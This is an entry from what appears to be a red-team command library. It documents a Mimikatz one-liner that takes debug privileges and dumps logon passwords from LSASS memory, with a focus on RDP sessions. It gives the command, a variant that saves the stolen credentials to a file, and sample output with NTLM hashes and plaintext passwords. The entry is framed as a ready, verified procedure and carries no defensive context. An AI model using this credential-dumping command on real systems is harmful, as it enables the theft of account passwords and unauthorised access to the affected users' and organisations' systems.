---
id: 2e837e3a-c7a7-40b0-8b84-63a3d5298690
name: mimikatz-extract-logon-passwords
type: command
executor: cmd
data: 'mimikatz.exe "privilege::debug" "ts::logonpasswords" "exit"'
output: null
created_at: '2023-04-06T03:56:27.446275+00:00'
updated_at: '2024-10-01T12:00:00+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - mimikatz
  - rdp
verified: true
validated: true
---

# mimikatz-extract-logon-passwords

## Command

```cmd
mimikatz.exe "privilege::debug" "ts::logonpasswords" "exit"
```

## Description

Executes Mimikatz in non-interactive mode to elevate to debug privileges and extract logon passwords from LSASS memory, focusing on RDP/Terminal Services sessions. This reveals plaintext passwords for active logons.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| No user-defined parameters; the command uses fixed Mimikatz modules for automation | N/A | N/A |

(Note: Run from the directory containing mimikatz.exe with administrator privileges.)

## Examples

### Basic Usage

```cmd
mimikatz.exe "privilege::debug" "ts::logonpasswords" "exit"
```

### Advanced Usage (with output redirection)

```cmd
mimikatz.exe "privilege::debug" "ts::logonpasswords" "exit" > creds.txt
```
(Redirects output to a file for later review.)

## Expected Output

Mimikatz banner followed by privilege elevation confirmation, then logon session details:

.#####.   mimikatz RPC Edition #XXXXXXX - x64 - Build 2.2.0
...
Privilege '20' OK

Logon Session 0x123456
 Authentication Package : NTLM
 Authentication Id : 0 ; 789012
 Session           : RDP from 1
 User Name         : user
 Domain            : DOMAIN
 Logon Server      : SERVER
 Logon Time        : 10/1/2024 12:00:00
 ...
 * Username : user
 * Domain   : DOMAIN
 * NTLM     : hash
 * Password : plaintextpass

exit status 0

Success if plaintext passwords appear under active RDP sessions.

## Related

- [[procedures/Windows-Mimikatz-RDP-Password-Extraction]]
- [[tools/Mimikatz]]
